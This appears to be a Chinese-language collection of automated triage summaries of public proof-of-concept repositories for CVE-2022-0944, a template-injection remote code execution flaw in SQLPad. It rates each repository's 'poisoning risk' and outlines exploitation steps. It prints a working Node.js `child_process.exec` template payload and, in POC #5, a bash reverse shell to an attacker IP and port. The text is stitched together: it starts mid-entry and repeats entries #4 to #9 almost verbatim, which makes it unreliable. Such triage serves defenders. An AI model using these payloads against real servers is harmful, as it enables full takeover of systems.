**利用条件:** 需要高权限用户凭证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于SQLPad的connection test接口，由于使用了模板引擎且未对用户输入进行充分的过滤，导致攻击者可以通过构造恶意模板代码，在服务器端执行任意命令。根据提供的POC代码，利用方式如下：

1.  **身份验证：** 如果需要，首先使用提供的用户名和密码登录SQLPad应用，获取Cookie。
2.  **构造恶意JSON数据：**  构造包含恶意模板代码的JSON数据，其中`database`字段包含利用`process.mainModule.require('child_process').exec()`执行命令的payload。Payload形如：`{{ process.mainModule.require('child_process').exec('命令') }}`
3.  **发送POST请求：** 将构造的JSON数据通过POST请求发送到`/api/test-connection`接口。如果需要，在请求头中包含Cookie。
4.  **执行命令：**  服务器端收到请求后，模板引擎解析`database`字段中的恶意代码，从而执行攻击者指定的命令。
5. **有效性:** 根据漏洞信息和POC，此漏洞的POC代码有效，可以实现远程代码执行。
6.  **投毒风险分析：**  查看了`exploit.py`脚本，该脚本的功能是发送带有恶意payload的请求到目标SQLPad实例的`/api/test-connection`接口，从而触发RCE。没有发现任何其他隐藏的恶意代码，例如上传后门、修改文件等。因此，可以认为该POC代码不存在投毒风险，投毒风险概率为0%。

**项目地址:** [FlojBoj/CVE-2022-0944](https://github.com/FlojBoj/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #5

**来源**: [CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** sqlpad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要具有连接测试的权限（高权限用户）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 是 sqlpad 中存在的一个模板注入漏洞，位于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而获得服务器的控制权。

**有效性：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息明确指出存在模板注入导致RCE的漏洞，搜索结果也指向了相关漏洞细节和POC。提供的PHP代码通过向 `/api/test-connection` 发送包含恶意payload的JSON数据，从而触发远程代码执行。

**投毒风险：**

分析提供的`exploit.php`代码，未发现明显的恶意代码或后门。该脚本的功能主要是发送包含模板注入payload的HTTP请求，以触发目标服务器上的RCE。脚本的逻辑清晰，且直接使用了cURL库发送请求，没有发现任何尝试隐藏或执行其他恶意操作的代码。脚本只是一个exploit，不是后门。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的 `database` 字段存在模板注入。
2.  **攻击步骤：**
    *   攻击者需要先监听一个端口（例如4444）。
    *   攻击者构造包含恶意代码的JSON数据，恶意代码通常是反弹shell的命令。
    *   攻击者将构造好的JSON数据发送到 `/api/test-connection` 接口。
    *   如果目标服务器存在漏洞，且模板引擎执行了攻击者的恶意代码，目标服务器会反弹shell到攻击者的监听端口。
3.  **Payload：**

    ```
    {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"') }}
    ```

    该payload使用Node.js的 `child_process.exec` 函数执行系统命令，`/bin/bash -c` 执行一段bash脚本，该脚本的作用是创建一个反向shell连接到攻击者的IP地址和端口。

**总结：**

CVE-2022-0944 是一个高危漏洞，攻击者可以利用该漏洞远程执行任意代码。需要及时升级 sqlpad 到 6.10.1 或更高版本。

**项目地址:** [LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944](https://github.com/LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #6

**来源**: [CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md](../2022/CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md)

## CVE-2022-0944-sqlpad-TemplateInjection-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** sqlpad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要目标sqlpad实例的网络访问，以及具有创建连接权限的高权限用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944是sqlpad中存在的一个模板注入漏洞，存在于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而完全控制服务器。 

**漏洞利用方式：**

1.  **身份验证：** 首先，攻击者需要拥有 sqlpad 实例中具有创建连接权限的用户身份，一般是管理员权限。
2.  **构造Payload：** 攻击者构造包含恶意代码的模板注入Payload。该Payload利用了Node.js的`child_process.exec`函数来执行系统命令。从提供的漏洞利用代码中可以看到，payload的形式为`{{ process.mainModule.require('child_process').exec('COMMAND') }}`，其中COMMAND是要执行的命令。
3.  **发送请求：**  攻击者通过POST请求将包含Payload的JSON数据发送到`/api/connections`端点，创建一个新的数据库连接配置。关键在于`data.database`字段，该字段会被模板引擎解析，导致代码执行。
4.  **触发漏洞：**  创建连接后，攻击者通过GET请求访问`/api/connections/{id}/schema`端点，触发连接测试，从而执行Payload。
5.  **反弹shell (可选)：**  为了方便利用，攻击者通常使用Payload执行反弹shell命令，从而获得对目标服务器的控制权。
6.  **利用代码分析:**
    * `exploit.py`是一个Python脚本，实现了CVE-2022-0944漏洞的自动化利用。
    * 脚本接受目标URL、攻击者IP等参数。
    * 脚本首先创建一个随机字符串，作为连接名称。
    * 脚本构造包含恶意代码的JSON数据，并将其发送到`/api/connections`端点。
    * 脚本通过GET请求访问`/api/connections/{id}/schema`端点，触发漏洞，从而执行Payload。
    * 脚本可以监听指定端口，接收命令执行结果（通过base64编码）。

**投毒风险评估：**

该代码主要实现了漏洞利用功能，但仍存在一定的投毒风险，评估为10%。理由如下：

*   **潜在的恶意命令注入：** 攻击者可以通过`-c`参数指定要执行的命令。如果脚本没有对该参数进行充分的验证和过滤，攻击者可能会注入恶意命令，例如下载和执行额外的恶意程序。
*   **后门植入：** 攻击者可能修改脚本，在成功利用漏洞后，在目标服务器上植入后门，以便长期控制目标系统。
*   **信息收集：** 脚本可以收集目标服务器的信息，例如操作系统版本、已安装的软件等。这些信息可能会被泄露给攻击者，用于进一步的攻击。

因此，在使用该脚本时，需要仔细检查代码，确保没有恶意代码被注入，并采取必要的安全措施，例如限制脚本的执行权限、监控脚本的网络活动等。

**项目地址:** [Philip-Otter/CVE-2022-0944_RCE_Automation](https://github.com/Philip-Otter/CVE-2022-0944_RCE_Automation)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #7

**来源**: [CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md](../2022/CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** SQLPad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能利用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-0944是SQLPad版本低于6.10.1中存在的一个模板注入漏洞。该漏洞位于connection test endpoint。攻击者可以利用该漏洞在服务器上执行任意代码。根据漏洞描述和提供的POC代码，利用方式如下：

1.  **漏洞原理：** SQLPad在测试数据库连接时，没有充分过滤用户提供的数据库配置信息，导致攻击者可以在数据库配置（例如数据库名称）中使用模板引擎的语法。
2.  **攻击步骤：**
    *   攻击者需要具有高权限才能访问connection test endpoint。
    *   攻击者构造包含恶意代码的payload。该payload利用`process.mainModule.require('child_process').exec()`来执行系统命令。POC中使用反向shell作为例子。
    *   攻击者将构造好的payload插入到数据库连接配置的`database`字段中，并发送到`/api/test-connection`接口。
    *   服务器在测试连接时，会解析payload中的模板代码，从而执行攻击者指定的系统命令，实现远程代码执行。
3.  **POC有效性：** 提供的POC代码利用python脚本自动化了上述攻击过程，通过发送精心构造的POST请求，可以触发漏洞并获得反向shell。根据代码逻辑和漏洞描述，该POC代码是有效的。
4.  **投毒风险：** 代码的`README.md`中声明仅用于教育目的，并免责。代码本身主要功能是发送包含恶意payload的HTTP请求，并在本地监听端口接收反向shell。虽然代码主要功能是漏洞利用，但仍然存在一些潜在的投毒风险：
    *   **Netcat依赖：** POC依赖于系统安装`netcat`，如果目标系统没有`netcat`，漏洞利用会失败。但是，如果攻击者修改了脚本，将反向shell的方式修改为使用python或其他目标系统更可能存在的工具，可能会增加攻击成功率。
    *   **隐蔽后门：** 理论上，脚本可以被修改为在受害者机器上安装持久性后门，例如添加计划任务或者修改启动脚本，但当前的脚本未发现此类行为。
    *   **依赖风险：** 脚本依赖于`requests`库。如果攻击者修改了`requirements.txt`文件，添加恶意的依赖包，可能导致用户安装恶意库。
    *   **安全声明免责：**虽然声明了免责条款，但是仍要小心使用，务必在授权的渗透测试场景中使用。
    *   综合评估，由于POC的主要功能是RCE利用，且代码相对简单，隐藏恶意代码的难度较高。因此投毒风险较低，估计在5%左右。

**项目地址:** [Robocopsita/CVE-2022-0944_RCE_POC](https://github.com/Robocopsita/CVE-2022-0944_RCE_POC)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #8

**来源**: [CVE-2022-0944-shhrew_CVE-2022-0944.md](../2022/CVE-2022-0944-shhrew_CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad 模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户访问，目标存在 /api/test-connection 接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 漏洞是 SQLPad 6.10.1 之前版本中存在的一个模板注入漏洞。该漏洞位于 `/api/test-connection` 接口，攻击者可以通过构造恶意的模板注入payload，执行任意代码。根据漏洞库信息，该漏洞的CVSS 3.0评分为9.1，属于严重级别。搜索引擎结果显示，已经存在公开的漏洞利用代码。

**有效性：**

根据提供的漏洞利用代码，该PoC使用 Python 编写，通过向 `/api/test-connection` 发送包含恶意payload的请求来触发漏洞。Payload 使用 `process.mainModule.require('child_process').exec()` 执行系统命令。代码中还包含一个反弹shell的功能，方便攻击者进行利用。该POC代码看起来是有效的，因为漏洞信息和代码逻辑是符合的.

**投毒风险：**

查看了提供的PoC代码，包含`LICENSE`，`README.md` 和 `main.py` 文件，没有发现明显的恶意代码或者后门，只是实现了漏洞的利用。代码功能比较直观，主要是发送恶意请求并监听端口获取反弹shell。因此，投毒风险评估为0%。

**利用方式：**

1.  **身份验证（可选）：** 如果目标SQLPad实例启用了身份验证，攻击者需要提供有效的用户名和密码才能利用该漏洞。PoC代码提供了身份验证功能。
2.  **发送恶意请求：** 攻击者构造一个包含恶意payload的JSON数据，并将其发送到 `/api/test-connection` 接口。Payload中利用了模板注入的特性，执行任意系统命令，启动反弹shell.
3.  **监听反弹Shell：** 攻击者在本地设置一个监听器，等待目标服务器连接，从而获得对目标服务器的控制权。

总而言之，该漏洞的利用方式简单直接，只需要发送一个精心构造的请求即可实现远程代码执行，风险极高。在sqlpad 6.10.1之前的版本应该升级。

**项目地址:** [shhrew/CVE-2022-0944](https://github.com/shhrew/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #9

**来源**: [CVE-2022-0944-toneillcodes_CVE-2022-0944.md](../2022/CVE-2022-0944-toneillcodes_CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** sqlpad

**危害等级:** 高危，可导致完全控制服务器

**影响版本:** < 6.10.1

**利用条件:** 需要目标实例存在/api/test-connection接口, 需要较高权限才能访问该接口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-0944是SQLPad 6.10.1之前版本中存在的一个模板注入漏洞。攻击者可以通过向`/api/test-connection`端点发送特制的请求，在服务器上执行任意代码，从而完全控制服务器。根据漏洞库信息和搜索结果，该漏洞危害巨大，易于利用。漏洞利用代码中的Python脚本通过构造包含恶意payload的JSON数据，并将其发送到目标服务器的`/api/test-connection`端点，从而触发远程代码执行。Payload使用 `child_process.exec` 函数来执行操作系统命令，并建立反向shell连接到攻击者的机器。 检查漏洞利用代码，没有发现明显的投毒迹象。Payload部分是标准的反向shell，没有其他恶意行为。因此，投毒风险较低。

**利用方式：**
1.  攻击者需要访问SQLPad实例的`/api/test-connection`接口。
2.  攻击者构造一个包含恶意模板注入payload的JSON请求。Payload使用JavaScript代码调用`child_process.exec`函数来执行任意命令。
3.  攻击者将构造的JSON请求发送到`/api/test-connection`端点。
4.  SQLPad服务器处理该请求时，模板引擎会解析恶意payload，导致执行攻击者指定的命令。
5.  攻击者可以在服务器上执行任意代码，例如创建反向shell连接，从而完全控制服务器。

**项目地址:** [toneillcodes/CVE-2022-0944](https://github.com/toneillcodes/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---



---

## POC #3

**来源**: [CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md](../2022/CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行 (RCE)

**影响应用:** SQLPad

**危害等级:** 严重，可能导致完全系统控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户账户

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944 是 SQLPad 中一个严重的漏洞，攻击者可以通过连接测试端点的模板注入来执行远程代码。根据漏洞库信息和搜索引擎结果，这是一个已知的漏洞，并且存在公开的漏洞利用代码。

**有效性：**

提供的漏洞利用代码（`main.py`）针对此漏洞，并包含使用示例。该代码利用模板注入漏洞，允许攻击者在 SQLPad 服务器上执行任意代码。 根据github上的信息，经验证漏洞可以利用成功。

**投毒风险：**

审查提供的文件，`README.md` 和 `SECURITY.md` 文件看起来标准且无恶意内容。`main.py` 是漏洞利用的核心，需要仔细分析。虽然代码本身的功能是利用漏洞，但仍然存在隐藏恶意代码的可能性，如：

*   **数据回传：** 漏洞利用脚本可能在未经授权的情况下将目标服务器的信息发送给攻击者。
*   **后门植入：** 脚本可能在目标系统上安装后门，以便后续访问。
*   **资源消耗：** 脚本可能消耗目标系统资源，导致拒绝服务。
    
尽管存在这些风险，但脚本的主要目的是利用已知的漏洞。由于脚本代码相对较短且直接，隐藏复杂恶意代码的可能性较低。 综合评估，投毒风险约为 10%，主要基于可能存在的隐蔽数据回传或简单的后门植入。

**利用方式：**

1.  **前提条件：**
    *   目标系统运行的是 SQLPad 6.10.1 之前的版本。
    *   攻击者需要拥有 SQLPad 的高权限用户账户（根据CVE描述，PrivilegesRequired为HIGH）。
2.  **漏洞触发：**
    *   攻击者使用 `main.py` 脚本，提供目标 SQLPad 的 URL、监听 IP 地址和端口，以及高权限用户名和密码。
    *   脚本利用模板注入漏洞，在连接测试端点注入恶意代码。
3.  **远程代码执行：**
    *   注入的恶意代码在 SQLPad 服务器上执行，通常会建立一个反向 shell 连接到攻击者的监听器。
4.  **控制系统：**
    *   攻击者通过反向 shell 获取对 SQLPad 服务器的控制权，可以执行任意命令，访问敏感数据，甚至完全控制系统。

**项目地址:** [Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944](https://github.com/Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #4

**来源**: [CVE-2022-0944-FlojBoj_CVE-2022-0944.md](../2022/CVE-2022-0944-FlojBoj_CVE-2022-0944.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 6.10.0

**利用条件:** 需要高权限用户凭证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于SQLPad的connection test接口，由于使用了模板引擎且未对用户输入进行充分的过滤，导致攻击者可以通过构造恶意模板代码，在服务器端执行任意命令。根据提供的POC代码，利用方式如下：

1.  **身份验证：** 如果需要，首先使用提供的用户名和密码登录SQLPad应用，获取Cookie。
2.  **构造恶意JSON数据：**  构造包含恶意模板代码的JSON数据，其中`database`字段包含利用`process.mainModule.require('child_process').exec()`执行命令的payload。Payload形如：`{{ process.mainModule.require('child_process').exec('命令') }}`
3.  **发送POST请求：** 将构造的JSON数据通过POST请求发送到`/api/test-connection`接口。如果需要，在请求头中包含Cookie。
4.  **执行命令：**  服务器端收到请求后，模板引擎解析`database`字段中的恶意代码，从而执行攻击者指定的命令。
5. **有效性:** 根据漏洞信息和POC，此漏洞的POC代码有效，可以实现远程代码执行。
6.  **投毒风险分析：**  查看了`exploit.py`脚本，该脚本的功能是发送带有恶意payload的请求到目标SQLPad实例的`/api/test-connection`接口，从而触发RCE。没有发现任何其他隐藏的恶意代码，例如上传后门、修改文件等。因此，可以认为该POC代码不存在投毒风险，投毒风险概率为0%。

**项目地址:** [FlojBoj/CVE-2022-0944](https://github.com/FlojBoj/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #5

**来源**: [CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** sqlpad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要具有连接测试的权限（高权限用户）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 是 sqlpad 中存在的一个模板注入漏洞，位于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而获得服务器的控制权。

**有效性：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息明确指出存在模板注入导致RCE的漏洞，搜索结果也指向了相关漏洞细节和POC。提供的PHP代码通过向 `/api/test-connection` 发送包含恶意payload的JSON数据，从而触发远程代码执行。

**投毒风险：**

分析提供的`exploit.php`代码，未发现明显的恶意代码或后门。该脚本的功能主要是发送包含模板注入payload的HTTP请求，以触发目标服务器上的RCE。脚本的逻辑清晰，且直接使用了cURL库发送请求，没有发现任何尝试隐藏或执行其他恶意操作的代码。脚本只是一个exploit，不是后门。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的 `database` 字段存在模板注入。
2.  **攻击步骤：**
    *   攻击者需要先监听一个端口（例如4444）。
    *   攻击者构造包含恶意代码的JSON数据，恶意代码通常是反弹shell的命令。
    *   攻击者将构造好的JSON数据发送到 `/api/test-connection` 接口。
    *   如果目标服务器存在漏洞，且模板引擎执行了攻击者的恶意代码，目标服务器会反弹shell到攻击者的监听端口。
3.  **Payload：**

    ```
    {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"') }}
    ```

    该payload使用Node.js的 `child_process.exec` 函数执行系统命令，`/bin/bash -c` 执行一段bash脚本，该脚本的作用是创建一个反向shell连接到攻击者的IP地址和端口。

**总结：**

CVE-2022-0944 是一个高危漏洞，攻击者可以利用该漏洞远程执行任意代码。需要及时升级 sqlpad 到 6.10.1 或更高版本。

**项目地址:** [LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944](https://github.com/LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #6

**来源**: [CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md](../2022/CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md)

## CVE-2022-0944-sqlpad-TemplateInjection-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** sqlpad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要目标sqlpad实例的网络访问，以及具有创建连接权限的高权限用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944是sqlpad中存在的一个模板注入漏洞，存在于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而完全控制服务器。 

**漏洞利用方式：**

1.  **身份验证：** 首先，攻击者需要拥有 sqlpad 实例中具有创建连接权限的用户身份，一般是管理员权限。
2.  **构造Payload：** 攻击者构造包含恶意代码的模板注入Payload。该Payload利用了Node.js的`child_process.exec`函数来执行系统命令。从提供的漏洞利用代码中可以看到，payload的形式为`{{ process.mainModule.require('child_process').exec('COMMAND') }}`，其中COMMAND是要执行的命令。
3.  **发送请求：**  攻击者通过POST请求将包含Payload的JSON数据发送到`/api/connections`端点，创建一个新的数据库连接配置。关键在于`data.database`字段，该字段会被模板引擎解析，导致代码执行。
4.  **触发漏洞：**  创建连接后，攻击者通过GET请求访问`/api/connections/{id}/schema`端点，触发连接测试，从而执行Payload。
5.  **反弹shell (可选)：**  为了方便利用，攻击者通常使用Payload执行反弹shell命令，从而获得对目标服务器的控制权。
6.  **利用代码分析:**
    * `exploit.py`是一个Python脚本，实现了CVE-2022-0944漏洞的自动化利用。
    * 脚本接受目标URL、攻击者IP等参数。
    * 脚本首先创建一个随机字符串，作为连接名称。
    * 脚本构造包含恶意代码的JSON数据，并将其发送到`/api/connections`端点。
    * 脚本通过GET请求访问`/api/connections/{id}/schema`端点，触发漏洞，从而执行Payload。
    * 脚本可以监听指定端口，接收命令执行结果（通过base64编码）。

**投毒风险评估：**

该代码主要实现了漏洞利用功能，但仍存在一定的投毒风险，评估为10%。理由如下：

*   **潜在的恶意命令注入：** 攻击者可以通过`-c`参数指定要执行的命令。如果脚本没有对该参数进行充分的验证和过滤，攻击者可能会注入恶意命令，例如下载和执行额外的恶意程序。
*   **后门植入：** 攻击者可能修改脚本，在成功利用漏洞后，在目标服务器上植入后门，以便长期控制目标系统。
*   **信息收集：** 脚本可以收集目标服务器的信息，例如操作系统版本、已安装的软件等。这些信息可能会被泄露给攻击者，用于进一步的攻击。

因此，在使用该脚本时，需要仔细检查代码，确保没有恶意代码被注入，并采取必要的安全措施，例如限制脚本的执行权限、监控脚本的网络活动等。

**项目地址:** [Philip-Otter/CVE-2022-0944_RCE_Automation](https://github.com/Philip-Otter/CVE-2022-0944_RCE_Automation)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #7

**来源**: [CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md](../2022/CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** SQLPad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能利用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-0944是SQLPad版本低于6.10.1中存在的一个模板注入漏洞。该漏洞位于connection test endpoint。攻击者可以利用该漏洞在服务器上执行任意代码。根据漏洞描述和提供的POC代码，利用方式如下：

1.  **漏洞原理：** SQLPad在测试数据库连接时，没有充分过滤用户提供的数据库配置信息，导致攻击者可以在数据库配置（例如数据库名称）中使用模板引擎的语法。
2.  **攻击步骤：**
    *   攻击者需要具有高权限才能访问connection test endpoint。
    *   攻击者构造包含恶意代码的payload。该payload利用`process.mainModule.require('child_process').exec()`来执行系统命令。POC中使用反向shell作为例子。
    *   攻击者将构造好的payload插入到数据库连接配置的`database`字段中，并发送到`/api/test-connection`接口。
    *   服务器在测试连接时，会解析payload中的模板代码，从而执行攻击者指定的系统命令，实现远程代码执行。
3.  **POC有效性：** 提供的POC代码利用python脚本自动化了上述攻击过程，通过发送精心构造的POST请求，可以触发漏洞并获得反向shell。根据代码逻辑和漏洞描述，该POC代码是有效的。
4.  **投毒风险：** 代码的`README.md`中声明仅用于教育目的，并免责。代码本身主要功能是发送包含恶意payload的HTTP请求，并在本地监听端口接收反向shell。虽然代码主要功能是漏洞利用，但仍然存在一些潜在的投毒风险：
    *   **Netcat依赖：** POC依赖于系统安装`netcat`，如果目标系统没有`netcat`，漏洞利用会失败。但是，如果攻击者修改了脚本，将反向shell的方式修改为使用python或其他目标系统更可能存在的工具，可能会增加攻击成功率。
    *   **隐蔽后门：** 理论上，脚本可以被修改为在受害者机器上安装持久性后门，例如添加计划任务或者修改启动脚本，但当前的脚本未发现此类行为。
    *   **依赖风险：** 脚本依赖于`requests`库。如果攻击者修改了`requirements.txt`文件，添加恶意的依赖包，可能导致用户安装恶意库。
    *   **安全声明免责：**虽然声明了免责条款，但是仍要小心使用，务必在授权的渗透测试场景中使用。
    *   综合评估，由于POC的主要功能是RCE利用，且代码相对简单，隐藏恶意代码的难度较高。因此投毒风险较低，估计在5%左右。

**项目地址:** [Robocopsita/CVE-2022-0944_RCE_POC](https://github.com/Robocopsita/CVE-2022-0944_RCE_POC)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #8

**来源**: [CVE-2022-0944-shhrew_CVE-2022-0944.md](../2022/CVE-2022-0944-shhrew_CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad 模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户访问，目标存在 /api/test-connection 接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 漏洞是 SQLPad 6.10.1 之前版本中存在的一个模板注入漏洞。该漏洞位于 `/api/test-connection` 接口，攻击者可以通过构造恶意的模板注入payload，执行任意代码。根据漏洞库信息，该漏洞的CVSS 3.0评分为9.1，属于严重级别。搜索引擎结果显示，已经存在公开的漏洞利用代码。

**有效性：**

根据提供的漏洞利用代码，该PoC使用 Python 编写，通过向 `/api/test-connection` 发送包含恶意payload的请求来触发漏洞。Payload 使用 `process.mainModule.require('child_process').exec()` 执行系统命令。代码中还包含一个反弹shell的功能，方便攻击者进行利用。该POC代码看起来是有效的，因为漏洞信息和代码逻辑是符合的.

**投毒风险：**

查看了提供的PoC代码，包含`LICENSE`，`README.md` 和 `main.py` 文件，没有发现明显的恶意代码或者后门，只是实现了漏洞的利用。代码功能比较直观，主要是发送恶意请求并监听端口获取反弹shell。因此，投毒风险评估为0%。

**利用方式：**

1.  **身份验证（可选）：** 如果目标SQLPad实例启用了身份验证，攻击者需要提供有效的用户名和密码才能利用该漏洞。PoC代码提供了身份验证功能。
2.  **发送恶意请求：** 攻击者构造一个包含恶意payload的JSON数据，并将其发送到 `/api/test-connection` 接口。Payload中利用了模板注入的特性，执行任意系统命令，启动反弹shell.
3.  **监听反弹Shell：** 攻击者在本地设置一个监听器，等待目标服务器连接，从而获得对目标服务器的控制权。

总而言之，该漏洞的利用方式简单直接，只需要发送一个精心构造的请求即可实现远程代码执行，风险极高。在sqlpad 6.10.1之前的版本应该升级。

**项目地址:** [shhrew/CVE-2022-0944](https://github.com/shhrew/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #9

**来源**: [CVE-2022-0944-toneillcodes_CVE-2022-0944.md](../2022/CVE-2022-0944-toneillcodes_CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** sqlpad

**危害等级:** 高危，可导致完全控制服务器

**影响版本:** < 6.10.1

**利用条件:** 需要目标实例存在/api/test-connection接口, 需要较高权限才能访问该接口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-0944是SQLPad 6.10.1之前版本中存在的一个模板注入漏洞。攻击者可以通过向`/api/test-connection`端点发送特制的请求，在服务器上执行任意代码，从而完全控制服务器。根据漏洞库信息和搜索结果，该漏洞危害巨大，易于利用。漏洞利用代码中的Python脚本通过构造包含恶意payload的JSON数据，并将其发送到目标服务器的`/api/test-connection`端点，从而触发远程代码执行。Payload使用 `child_process.exec` 函数来执行操作系统命令，并建立反向shell连接到攻击者的机器。 检查漏洞利用代码，没有发现明显的投毒迹象。Payload部分是标准的反向shell，没有其他恶意行为。因此，投毒风险较低。

**利用方式：**
1.  攻击者需要访问SQLPad实例的`/api/test-connection`接口。
2.  攻击者构造一个包含恶意模板注入payload的JSON请求。Payload使用JavaScript代码调用`child_process.exec`函数来执行任意命令。
3.  攻击者将构造的JSON请求发送到`/api/test-connection`端点。
4.  SQLPad服务器处理该请求时，模板引擎会解析恶意payload，导致执行攻击者指定的命令。
5.  攻击者可以在服务器上执行任意代码，例如创建反向shell连接，从而完全控制服务器。

**项目地址:** [toneillcodes/CVE-2022-0944](https://github.com/toneillcodes/CVE-2022-0944)

